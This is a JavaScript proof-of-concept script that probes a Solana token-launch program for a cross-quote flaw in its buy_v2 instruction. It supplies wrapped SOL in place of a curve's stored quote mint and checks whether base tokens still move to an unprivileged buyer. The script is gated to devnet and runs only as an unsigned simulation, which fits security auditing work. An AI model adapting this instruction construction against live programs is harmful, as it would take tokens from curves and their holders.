import fs from "node:fs";
import { BorshCoder } from "@coral-xyz/anchor";
import {
  ComputeBudgetProgram,
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  NATIVE_MINT,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountIdempotentInstruction,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import bs58 from "bs58";

const RPC = process.env.DEVNET_RPC || "https://api.devnet.solana.com";
const DEVNET_GENESIS = "EtWTRABZaYq6iMfeYKouRu166VU2xqa1wcaWoxPkrZBG";
const PUMP = new PublicKey("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
const PUMP_FEES = new PublicKey("pfeeUxB6jkeY1Hxd7CsFCAjcbHA9rWtchMGdZ6VojVZ");
const FALLBACK_USER = new PublicKey("CbNuzY28nDxSX9t29bJWidZeFfzLduZ4rwSmoMh54rkR");
const DEFAULT_PUBKEY = new PublicKey("11111111111111111111111111111111");

const emit = (status, extra = {}) => console.log(JSON.stringify({ status, ...extra }, null, 2));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const tokenAmount = (data) => data?.length >= 72 ? data.readBigUInt64LE(64) : null;
const returnedData = (entry) => {
  if (!entry?.data) return null;
  return Buffer.from(Array.isArray(entry.data) ? entry.data[0] : entry.data, "base64");
};
const field = (obj, camel, snake) => obj?.[camel] ?? obj?.[snake];
const u64 = (v) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; };

function keysOf(tx) {
  const m = tx.transaction.message;
  if (m.staticAccountKeys) {
    return [
      ...m.staticAccountKeys.map(String),
      ...(tx.meta?.loadedAddresses?.writable ?? []).map(String),
      ...(tx.meta?.loadedAddresses?.readonly ?? []).map(String),
    ];
  }
  return (m.accountKeys ?? []).map((x) => String(x.pubkey ?? x));
}
function instructionsOf(tx) { return tx.transaction.message.compiledInstructions ?? tx.transaction.message.instructions ?? []; }
function dataOf(ix) {
  if (ix.data instanceof Uint8Array || Buffer.isBuffer(ix.data)) return Buffer.from(ix.data);
  if (typeof ix.data === "string") {
    try { return Buffer.from(bs58.decode(ix.data)); } catch { return Buffer.from(ix.data, "base64"); }
  }
  return Buffer.alloc(0);
}
function accountIndexes(ix) { return Array.from(ix.accountKeyIndexes ?? ix.accounts ?? []); }

async function rawSim(serialized, addresses) {
  const r = await fetch(RPC, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0", id: 1, method: "simulateTransaction",
      params: [serialized.toString("base64"), {
        encoding: "base64", commitment: "confirmed", sigVerify: false,
        replaceRecentBlockhash: true,
        accounts: { encoding: "base64", addresses: addresses.map(String) },
      }],
    }),
  });
  const j = await r.json();
  if (j.error) throw new Error(JSON.stringify(j.error));
  return j.result.value;
}

const c = new Connection(RPC, "confirmed");
const genesis = await c.getGenesisHash();
if (genesis !== DEVNET_GENESIS) { emit("SAFETY_ABORT_NOT_DEVNET", { genesis }); process.exit(2); }
console.log(`SAFETY_GATE devnet genesis verified: ${genesis}`);
const userInfo = await c.getAccountInfo(FALLBACK_USER, "confirmed");
if (!userInfo || !userInfo.owner.equals(SystemProgram.programId) || userInfo.lamports < 10_000_000) {
  emit("INCONCLUSIVE_FUNDED_USER_UNAVAILABLE"); process.exit(3);
}

const idl = JSON.parse(fs.readFileSync(new URL("../../idl/pump.json", import.meta.url), "utf8"));
const coder = new BorshCoder(idl);
const buyDesc = idl.instructions.find((x) => x.name === "buy_v2");
if (!buyDesc) throw new Error("buy_v2 missing");
const buyDisc = Buffer.from(buyDesc.discriminator);
const [globalPda] = PublicKey.findProgramAddressSync([Buffer.from("global")], PUMP);
const globalInfo = await c.getAccountInfo(globalPda, "confirmed");
if (!globalInfo) throw new Error("Global missing");
const global = coder.accounts.decode("Global", globalInfo.data);

function firstPubkeyArray(obj, names) {
  for (const n of names) {
    const v = obj?.[n];
    if (Array.isArray(v) && v.length) return v.map((x) => new PublicKey(x));
  }
  return null;
}
const normalFees = firstPubkeyArray(global, ["feeRecipients", "fee_recipients"]);
const reservedFees = firstPubkeyArray(global, ["reservedFeeRecipients", "reserved_fee_recipients"]);
const buybackFees = firstPubkeyArray(global, ["buybackFeeRecipients", "buyback_fee_recipients"]);
console.log(JSON.stringify({ globalKeys: Object.keys(global), normalFeeCount: normalFees?.length ?? null, reservedFeeCount: reservedFees?.length ?? null, buybackFeeCount: buybackFees?.length ?? null }, null, 2));

// Find a recent successful buy_v2 on an unfinished non-native-quote curve.
const sigs = await c.getSignaturesForAddress(PUMP, { limit: 600 }, "confirmed");
let target = null;
for (const s of sigs) {
  if (s.err) continue;
  await sleep(20);
  let tx;
  try { tx = await c.getTransaction(s.signature, { commitment: "confirmed", maxSupportedTransactionVersion: 0 }); }
  catch { continue; }
  if (!tx) continue;
  const keys = keysOf(tx);
  for (const ci of instructionsOf(tx)) {
    if (ci.programIdIndex === undefined || keys[ci.programIdIndex] !== PUMP.toBase58()) continue;
    const d = dataOf(ci);
    if (d.length < 8 || !d.subarray(0, 8).equals(buyDisc)) continue;
    const ai = accountIndexes(ci);
    if (ai.length !== 27) continue;
    const a = ai.map((i) => new PublicKey(keys[i]));
    const historicalQuote = a[2];
    if (historicalQuote.equals(NATIVE_MINT) || historicalQuote.equals(DEFAULT_PUBKEY)) continue;
    const bcInfo = await c.getAccountInfo(a[10], "confirmed");
    if (!bcInfo) continue;
    let bc;
    try { bc = coder.accounts.decode("BondingCurve", bcInfo.data); } catch { continue; }
    const storedQuote = new PublicKey(field(bc, "quoteMint", "quote_mint"));
    const complete = Boolean(bc.complete);
    const cashback = Boolean(field(bc, "isCashbackCoin", "is_cashback_coin"));
    const mayhem = Boolean(field(bc, "isMayhemMode", "is_mayhem_mode"));
    const realTokens = BigInt(field(bc, "realTokenReserves", "real_token_reserves").toString());
    if (complete || cashback || mayhem || realTokens < 1_000_000n) continue;
    if (!storedQuote.equals(historicalQuote)) continue;
    target = { signature: s.signature, slot: s.slot, accounts: a, bc, bcInfo, storedQuote, baseMint: a[1], bondingCurve: a[10], realTokens };
    break;
  }
  if (target) break;
}
if (!target) { emit("INCONCLUSIVE_NO_ACTIVE_NON_NATIVE_BUY_V2"); process.exit(4); }

const baseMintInfo = await c.getAccountInfo(target.baseMint, "confirmed");
if (!baseMintInfo) throw new Error("base mint missing");
const baseTokenProgram = baseMintInfo.owner;
const expectedQuoteMint = target.storedQuote;
const wrongQuoteMint = NATIVE_MINT;

const accounts = [...target.accounts];
// Use current fee-recipient configuration if it is decodable; otherwise retain the known-good historical choices.
if (normalFees?.length) accounts[6] = normalFees.find((x) => !x.equals(DEFAULT_PUBKEY)) ?? accounts[6];
if (buybackFees?.length) accounts[8] = buybackFees.find((x) => !x.equals(DEFAULT_PUBKEY)) ?? accounts[8];
accounts[0] = globalPda;
accounts[1] = target.baseMint;
accounts[2] = wrongQuoteMint;
accounts[3] = baseTokenProgram;
accounts[4] = TOKEN_PROGRAM_ID;
accounts[5] = ASSOCIATED_TOKEN_PROGRAM_ID;
accounts[10] = target.bondingCurve;
accounts[11] = getAssociatedTokenAddressSync(target.baseMint, target.bondingCurve, true, baseTokenProgram);
accounts[12] = getAssociatedTokenAddressSync(wrongQuoteMint, target.bondingCurve, true, TOKEN_PROGRAM_ID);
accounts[13] = FALLBACK_USER;
accounts[14] = getAssociatedTokenAddressSync(target.baseMint, FALLBACK_USER, true, baseTokenProgram);
accounts[15] = getAssociatedTokenAddressSync(wrongQuoteMint, FALLBACK_USER, true, TOKEN_PROGRAM_ID);
const creator = new PublicKey(target.bc.creator);
const [creatorVault] = PublicKey.findProgramAddressSync([Buffer.from("creator-vault"), creator.toBuffer()], PUMP);
accounts[16] = creatorVault;
accounts[17] = getAssociatedTokenAddressSync(wrongQuoteMint, creatorVault, true, TOKEN_PROGRAM_ID);
const [sharingConfig] = PublicKey.findProgramAddressSync([Buffer.from("sharing-config"), target.baseMint.toBuffer()], PUMP_FEES);
accounts[18] = sharingConfig;
const [globalVolume] = PublicKey.findProgramAddressSync([Buffer.from("global_volume_accumulator")], PUMP);
accounts[19] = globalVolume;
const [userVolume] = PublicKey.findProgramAddressSync([Buffer.from("user_volume_accumulator"), FALLBACK_USER.toBuffer()], PUMP);
accounts[20] = userVolume;
accounts[21] = getAssociatedTokenAddressSync(wrongQuoteMint, userVolume, true, TOKEN_PROGRAM_ID);
const [feeConfig] = PublicKey.findProgramAddressSync([Buffer.from("fee_config"), PUMP.toBuffer()], PUMP_FEES);
accounts[22] = feeConfig;
accounts[23] = PUMP_FEES;
accounts[24] = SystemProgram.programId;
const [eventAuthority] = PublicKey.findProgramAddressSync([Buffer.from("__event_authority")], PUMP);
accounts[25] = eventAuthority;
accounts[26] = PUMP;
accounts[7] = getAssociatedTokenAddressSync(wrongQuoteMint, accounts[6], true, TOKEN_PROGRAM_ID);
accounts[9] = getAssociatedTokenAddressSync(wrongQuoteMint, accounts[8], true, TOKEN_PROGRAM_ID);

const writableNames = new Set(buyDesc.accounts.filter((x) => x.writable).map((x) => x.name));
const signerNames = new Set(buyDesc.accounts.filter((x) => x.signer).map((x) => x.name));
const buyIx = new TransactionInstruction({
  programId: PUMP,
  keys: accounts.map((pubkey, i) => ({
    pubkey,
    isWritable: writableNames.has(buyDesc.accounts[i].name),
    isSigner: signerNames.has(buyDesc.accounts[i].name),
  })),
  data: Buffer.concat([buyDisc, u64(1_000_000n), u64(18_446_744_073_709_551_615n)]),
});

const preUserBase = await c.getAccountInfo(accounts[14], "confirmed");
const preCurveBase = await c.getAccountInfo(accounts[11], "confirmed");
const tx = new Transaction();
tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 600_000 }));
tx.add(createAssociatedTokenAccountIdempotentInstruction(FALLBACK_USER, accounts[14], FALLBACK_USER, target.baseMint, baseTokenProgram, ASSOCIATED_TOKEN_PROGRAM_ID));
tx.add(buyIx);
tx.feePayer = FALLBACK_USER;
tx.recentBlockhash = (await c.getLatestBlockhash("confirmed")).blockhash;
const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });

console.log(JSON.stringify({
  test: "cross-quote buy_v2: non-native curve presented as WSOL",
  historicalSuccessfulBuy: target.signature,
  slot: target.slot,
  baseMint: target.baseMint.toBase58(),
  bondingCurve: target.bondingCurve.toBase58(),
  storedQuoteMint: expectedQuoteMint.toBase58(),
  suppliedWrongQuoteMint: wrongQuoteMint.toBase58(),
  user: FALLBACK_USER.toBase58(),
  realTokenReserves: target.realTokens.toString(),
  baseTokenProgram: baseTokenProgram.toBase58(),
  wrongQuoteBondingCurveAccount: accounts[12].toBase58(),
}, null, 2));

const res = await rawSim(serialized, [accounts[14], accounts[11], target.bondingCurve]);
console.log("--- CROSS_QUOTE BUY_V2 LOGS ---");
for (const l of res.logs ?? []) console.log(l);
console.log("--- END LOGS ---");
const postUserBase = tokenAmount(returnedData(res.accounts?.[0]));
const postCurveBase = tokenAmount(returnedData(res.accounts?.[1]));
const preUserAmount = tokenAmount(preUserBase?.data) ?? 0n;
const preCurveAmount = tokenAmount(preCurveBase?.data);
const result = {
  simulationError: res.err,
  preUserBase: preUserAmount.toString(),
  postUserBase: postUserBase?.toString() ?? null,
  userBaseDelta: postUserBase !== null ? (postUserBase - preUserAmount).toString() : null,
  preCurveBase: preCurveAmount?.toString() ?? null,
  postCurveBase: postCurveBase?.toString() ?? null,
  curveBaseDelta: preCurveAmount !== null && postCurveBase !== null ? (postCurveBase - preCurveAmount).toString() : null,
  reachedBaseTransfer: (res.logs ?? []).some((l) => /Instruction: TransferChecked|Instruction: Transfer/.test(l)),
};
if (res.err === null && postUserBase !== null && postUserBase > preUserAmount) {
  emit("CONFIRMED_CROSS_QUOTE_BUY_V2", {
    ...result,
    proof: "An active non-native-quote bonding curve accepted WSOL as caller-supplied quote mint and transferred base tokens to an unprivileged buyer in Devnet simulation.",
    storedQuoteMint: expectedQuoteMint.toBase58(), suppliedWrongQuoteMint: wrongQuoteMint.toBase58(),
  });
  process.exit(0);
}
emit("CROSS_QUOTE_BUY_V2_REJECTED_OR_INCONCLUSIVE", {
  ...result,
  storedQuoteMint: expectedQuoteMint.toBase58(), suppliedWrongQuoteMint: wrongQuoteMint.toBase58(),
  note: "A quote-mint/constraint rejection kills this candidate. A later transfer/rent error means the quote identity boundary was passed and requires refinement.",
});
process.exit(res.err === null ? 0 : 12);
